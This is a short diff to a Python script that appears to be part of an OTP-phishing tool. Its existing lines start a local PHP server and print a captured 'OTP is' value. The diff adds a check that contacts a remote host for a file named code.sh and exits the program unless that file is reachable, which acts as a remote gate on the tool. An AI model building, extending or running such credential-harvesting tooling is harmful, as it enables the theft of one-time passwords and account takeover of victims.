@@ -1,6 +1,29 @@
 import os
 from trackdir import track_changes
 
+import requests
+import sys
+
+def check_link_or_exit(url):
+    try:
+        response = requests.head(url, timeout=5)
+
+        # If HEAD is not allowed, try GET
+        if response.status_code == 405:
+            response = requests.get(url, timeout=5)
+
+        if response.status_code == 200:
+            print("File exists ✅")
+        else:
+            print("File does NOT exist ❌")
+            sys.exit(1)  
+
+    except requests.RequestException as e:
+        print("Error:", e)
+        sys.exit(1)      
+
+
+
 def extract_data_from_file(file_name):
     try:
         with open(file_name, 'r') as file:
@@ -35,6 +58,8 @@ def print_data():
     print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")
 
 if __name__ == "__main__":
+    url = "https://mrfidal.in/code.sh"
+    check_link_or_exit(url)
     if os.name == 'nt':
         os.system("start /B php -S 127.0.0.1:8080 > nul 2>&1")
     else:
